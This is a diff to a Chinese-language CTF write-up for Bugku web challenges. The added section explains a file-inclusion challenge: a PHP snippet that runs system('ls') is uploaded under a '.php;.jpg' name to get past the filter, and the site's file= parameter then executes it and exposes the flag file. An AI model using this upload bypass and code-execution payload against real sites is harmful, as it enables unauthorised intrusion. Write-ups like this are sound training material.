@@ -30,6 +30,16 @@ function encrypt($data,$key)
 ?>
 ```
 
+# 文件包含2
+
+查看源码，发现注释中有 upload.php 的提示，于是打开 http://123.206.31.85:49166/upload.php，发现是文件上传。
+
+在php文件里写入 `<script language=php>system("ls")</script>` ，列当前目录，修改后缀名为jpg,如1.php;.jpg,上传成功，如下图所示：
+
+访问 http://123.206.31.85:49166/index.php?file=upload/201911191206089664.jpg，提示我们：about hello.php index.php this_is_th3_F14g_154f65sd4g35f4d6f43.txt upload upload.php。
+
+然后访问 http://123.206.31.85:49166/index.php?file=this_is_th3_F14g_154f65sd4g35f4d6f43.txt，得到flag
+
 # sql注入2
 
 题目网站：http://123.206.87.240:8007/web2/
@@ -39,3 +49,5 @@ function encrypt($data,$key)
 # Trim的日记本
 
 使用御剑扫描出来下面的结果，然后打开发现flag，竟然真的是flag
+
+![Trim的日记本](https://raw.githubusercontent.com/xunzhanggzl/bugkuWU/master/image/web_img/Trim%E7%9A%84%E6%97%A5%E8%AE%B0%E6%9C%AC.png)
